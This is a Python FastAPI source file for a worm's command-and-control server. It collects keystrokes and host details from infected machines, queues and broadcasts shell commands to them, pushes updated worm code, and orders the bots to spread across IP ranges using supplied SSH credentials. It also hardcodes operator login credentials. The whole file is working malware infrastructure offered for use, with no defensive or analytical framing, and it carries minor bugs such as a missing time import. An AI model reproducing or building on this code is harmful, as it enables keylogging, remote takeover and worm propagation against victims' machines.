from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from typing import List, Dict, Optional
import datetime
import random
import secrets
import hashlib
import os
import shutil
import zipfile
import subprocess
from pathlib import Path

app = FastAPI(title="C2 Worm Server", description="Worm Command & Control")

# Security
security = HTTPBasic()
USERNAME = "xotiic"
PASSWORD = "40671Mps19*"

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, USERNAME)
    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== Data Models ====================
class KeystrokeReport(BaseModel):
    ip: str
    keystrokes: str
    hostname: Optional[str] = None
    username: Optional[str] = None
    os_info: Optional[str] = None

class CommandRequest(BaseModel):
    ip: str
    command: str
    is_terminal: bool = False  # True for terminal commands, False for C2 commands

class TerminalCommand(BaseModel):
    command: str
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class CodeUploadResponse(BaseModel):
    filename: str
    version: str
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class PropagationCommand(BaseModel):
    target_range: str  # e.g., "192.168.1.0/24"
    username: str
    password: str
    ssh_key: Optional[str] = None

# ==================== In-Memory Storage ====================
logs: List[Dict] = []
bots: Dict[str, dict] = {}
commands: Dict[str, List[dict]] = {}  # Now stores commands with metadata
terminal_outputs: Dict[str, List[str]] = {}  # Store terminal outputs from bots
worm_code_versions: Dict[str, str] = {}  # version -> code
current_worm_version = "1.0.0"
worm_code = ""  # Will be loaded from file

# Create directories
os.makedirs("uploads", exist_ok=True)
os.makedirs("worm_versions", exist_ok=True)

# ==================== API Endpoints ====================

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    with open("templates/index.html", "r") as f:
        return f.read()

@app.post("/api/report")
async def report_keystrokes(report: KeystrokeReport):
    """Receive keystrokes and system info from worm."""
    log_entry = {
        "ip": report.ip,
        "keystrokes": report.keystrokes,
        "hostname": report.hostname or "unknown",
        "username": report.username or "unknown",
        "os_info": report.os_info or "unknown",
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    logs.append(log_entry)
    if len(logs) > 10000:
        logs.pop(0)
    
    # Update bot info
    if report.ip not in bots:
        bots[report.ip] = {
            "first_seen": datetime.datetime.utcnow().isoformat(),
            "version": current_worm_version
        }
    
    bots[report.ip].update({
        "last_seen": datetime.datetime.utcnow().isoformat(),
        "status": "active",
        "hostname": report.hostname,
        "username": report.username,
        "os_info": report.os_info
    })
    return {"status": "ok"}

@app.post("/api/terminal_output")
async def report_terminal_output(ip: str, output: str):
    """Receive terminal command output from worm."""
    if ip not in terminal_outputs:
        terminal_outputs[ip] = []
    terminal_outputs[ip].append({
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "output": output
    })
    # Keep last 100 outputs per bot
    if len(terminal_outputs[ip]) > 100:
        terminal_outputs[ip].pop(0)
    return {"status": "ok"}

@app.get("/api/commands")
async def get_commands(ip: str, last_command_id: Optional[int] = None):
    """Worm polls for commands with optional command ID for tracking."""
    if ip not in commands:
        return {"commands": [], "version": current_worm_version}
    
    # Get new commands since last_command_id
    all_cmds = commands.get(ip, [])
    if last_command_id:
        new_cmds = [cmd for cmd in all_cmds if cmd.get("id", 0) > last_command_id]
    else:
        new_cmds = all_cmds
    
    return {
        "commands": new_cmds,
        "version": current_worm_version,
        "worm_code": worm_code if worm_code else None
    }

@app.post("/api/commands")
async def issue_command(cmd_req: CommandRequest, username: str = Depends(authenticate)):
    """Issue a command to a specific bot."""
    cmd_id = int(time.time() * 1000)  # Use timestamp as ID
    
    cmd_data = {
        "id": cmd_id,
        "command": cmd_req.command,
        "is_terminal": cmd_req.is_terminal,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    if cmd_req.ip not in commands:
        commands[cmd_req.ip] = []
    commands[cmd_req.ip].append(cmd_data)
    
    return {"status": "command queued", "command_id": cmd_id}

@app.post("/api/broadcast")
async def broadcast_command(cmd: TerminalCommand, username: str = Depends(authenticate)):
    """Broadcast terminal command to multiple bots."""
    cmd_id = int(time.time() * 1000)
    
    # Determine target bots
    now = datetime.datetime.utcnow()
    active_bots = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        if (now - last).seconds < 300:
            active_bots.append(ip)
    
    target_bots = active_bots if cmd.all_bots else [ip for ip in cmd.target_ips if ip in active_bots]
    
    cmd_data = {
        "id": cmd_id,
        "command": cmd.command,
        "is_terminal": True,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    for ip in target_bots:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "broadcast sent",
        "bots_targeted": len(target_bots),
        "command_id": cmd_id
    }

@app.post("/api/upload_code")
async def upload_code(
    file: UploadFile = File(...),
    version: str = "1.0.0",
    all_bots: bool = True,
    target_ips: Optional[str] = None,
    username: str = Depends(authenticate)
):
    """Upload new worm code and distribute to bots."""
    global worm_code, current_worm_version
    
    # Save uploaded file
    file_path = f"worm_versions/worm_v{version}.py"
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)
    
    # Update current version
    worm_code = content.decode()
    current_worm_version = version
    
    # Create update command for bots
    cmd_id = int(time.time() * 1000)
    cmd_data = {
        "id": cmd_id,
        "command": "update_code",
        "is_terminal": False,
        "version": version,
        "code": worm_code,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    # Determine target bots
    now = datetime.datetime.utcnow()
    target_bot_list = []
    if all_bots:
        target_bot_list = [ip for ip, info in bots.items() 
                          if (now - datetime.datetime.fromisoformat(info["last_seen"])).seconds < 300]
    elif target_ips:
        target_list = target_ips.split(',')
        target_bot_list = [ip for ip in target_list if ip in bots]
    
    for ip in target_bot_list:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "code uploaded and distribution started",
        "version": version,
        "bots_targeted": len(target_bot_list)
    }

@app.post("/api/propagate")
async def propagate_worm(prop: PropagationCommand, username: str = Depends(authenticate)):
    """Command worms to spread to new targets."""
    cmd_id = int(time.time() * 1000)
    cmd_data = {
        "id": cmd_id,
        "command": f"propagate:{prop.target_range}:{prop.username}:{prop.password}",
        "is_terminal": False,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    # Send to all active bots
    now = datetime.datetime.utcnow()
    for ip, info in bots.items():
        if (now - datetime.datetime.fromisoformat(info["last_seen"])).seconds < 300:
            if ip not in commands:
                commands[ip] = []
            commands[ip].append(cmd_data)
    
    return {"status": "propagation command sent"}

@app.get("/api/terminal_outputs")
async def get_terminal_outputs(ip: Optional[str] = None, username: str = Depends(authenticate)):
    """Get terminal command outputs."""
    if ip:
        return {ip: terminal_outputs.get(ip, [])}
    return terminal_outputs

@app.get("/api/logs")
async def get_logs(limit: int = 50, ip_filter: Optional[str] = None, username: str = Depends(authenticate)):
    filtered_logs = logs if not ip_filter else [log for log in logs if log["ip"] == ip_filter]
    return filtered_logs[-limit:][::-1]

@app.get("/api/bots")
async def get_bots(username: str = Depends(authenticate)):
    now = datetime.datetime.utcnow()
    bot_list = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        is_active = (now - last).seconds < 300
        bot_list.append({
            "ip": ip,
            "hostname": info.get("hostname", "unknown"),
            "username": info.get("username", "unknown"),
            "os_info": info.get("os_info", "unknown"),
            "version": info.get("version", "unknown"),
            "last_seen": info["last_seen"],
            "first_seen": info.get("first_seen", info["last_seen"]),
            "status": "active" if is_active else "inactive"
        })
    return sorted(bot_list, key=lambda x: x["last_seen"], reverse=True)

@app.get("/api/worm_code")
async def get_worm_code(version: Optional[str] = None, username: str = Depends(authenticate)):
    """Download worm code."""
    if version:
        file_path = f"worm_versions/worm_v{version}.py"
    else:
        file_path = "worm_versions/worm_v{current_worm_version}.py"
    
    if os.path.exists(file_path):
        return FileResponse(file_path)
    return {"error": "Version not found"}

if __name__ == "__main__":
    import uvicorn
    os.makedirs("templates", exist_ok=True)
    uvicorn.run(app, host="0.0.0.0", port=5000)
